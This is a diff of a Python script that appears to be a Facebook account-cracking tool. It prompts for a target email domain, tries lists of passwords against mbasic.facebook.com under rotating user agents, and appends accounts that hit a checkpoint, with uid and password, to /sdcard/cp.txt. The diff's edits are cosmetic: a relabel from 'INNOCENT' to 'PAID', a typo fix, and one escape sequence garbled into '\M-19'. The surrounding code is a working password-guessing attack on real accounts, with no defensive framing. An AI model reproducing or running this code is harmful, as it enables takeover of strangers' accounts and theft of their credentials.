@@ -76,15 +76,13 @@ os.system('xdg-open https://github.com/Manik-19')
 logo = ("""
 \033[1;91m   
 \033[1;92m 
- 
+
     ███    ███  █████  ███    ██ ██ ██   ██      
     ████  ████ ██   ██ ████   ██ ██ ██  ██  
     ██ ████ ██ ███████ ██ ██  ██ ██ █████   
     ██  ██  ██ ██   ██ ██  ██ ██ ██ ██  ██  
     ██      ██ ██   ██ ██   ████ ██ ██   ██ 
-      
-                                        
-                                        
+                                             
 \033[1;93m   
 \033[1;94m   
 \033[1;95m    033[1;92m
@@ -165,7 +163,7 @@ def gml():
     print(logo)
     print(' [+] EXAMPLE : @gmail.com, @yahoo.com ')
     print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-    doamin = input(' [?] Terget doamin : ')
+    doamin = input(' [?] Target doamin : ')
     os.system('clear')
     print(logo)
     print(' [+] EXAMPLE : 3000, 5000, 10000, 50000 ')
@@ -178,7 +176,7 @@ def gml():
         os.system('clear')
         print(logo)
         tl = str(len(user))
-        print(' \033[1;97m[+] Total ids:\033[1;92m '+tl)
+        print(' \033[1;97m[+] Total ids:\M-19[1;92m '+tl)
         print(' \033[1;97m[+] Process has been started')
         print(' \033[1;97m[!] Wait for ids ')
         print(' \033[1;97m[!] Use flight mode for speed up ')
@@ -198,7 +196,7 @@ def rcrack1(uid,pwx,tl):
         for ps in pwx:
             pro = random.choice(ugen)
             session = requests.Session()
-            sys.stdout.write('\r[\033[1;92mINNOCENT\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
+            sys.stdout.write('\r[\033[1;92mPAID\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
             sys.stdout.flush()
             free_fb = session.get('https://mbasic.facebook.com').text
             log_data = {
@@ -239,7 +237,7 @@ def rcrack1(uid,pwx,tl):
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[82:97]
-                print(f"\x1b[38;5;196m[INNOCENT-CP] {cid}|{ps}")
+                print(f"\x1b[38;5;196m[PAID-CP] {cid}|{ps}")
                 open('/sdcard/cp.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(uid)
                 break
